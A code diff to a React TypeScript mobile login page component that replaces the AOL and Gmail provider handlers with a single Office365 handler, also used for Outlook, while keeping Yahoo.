@@ -9,8 +9,7 @@ interface LoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
   onYahooSelect?: () => void;
-  onAolSelect?: () => void;
-  onGmailSelect?: () => void; // New prop
+  onOffice365Select?: () => void; // New prop
 }
 
 const MobileLoginPage: React.FC<LoginPageProps> = ({ 
@@ -18,8 +17,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   onLoginSuccess,
   onLoginError,
   onYahooSelect,
-  onAolSelect,
-  onGmailSelect, // Destructure prop
+  onOffice365Select, // Destructure
 }) => {
   const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
   const [email, setEmail] = useState('');
@@ -55,12 +53,12 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   };
 
   const handleProviderClick = (providerName: string) => {
-    if (providerName === 'Yahoo' && onYahooSelect) {
+    if (providerName === 'Office365' && onOffice365Select) {
+      onOffice365Select();
+    } else if (providerName === 'Outlook' && onOffice365Select) {
+      onOffice365Select();
+    } else if (providerName === 'Yahoo' && onYahooSelect) {
       onYahooSelect();
-    } else if (providerName === 'AOL' && onAolSelect) {
-      onAolSelect();
-    } else if (providerName === 'Gmail' && onGmailSelect) {
-      onGmailSelect();
     } else {
       setSelectedProvider(providerName);
     }
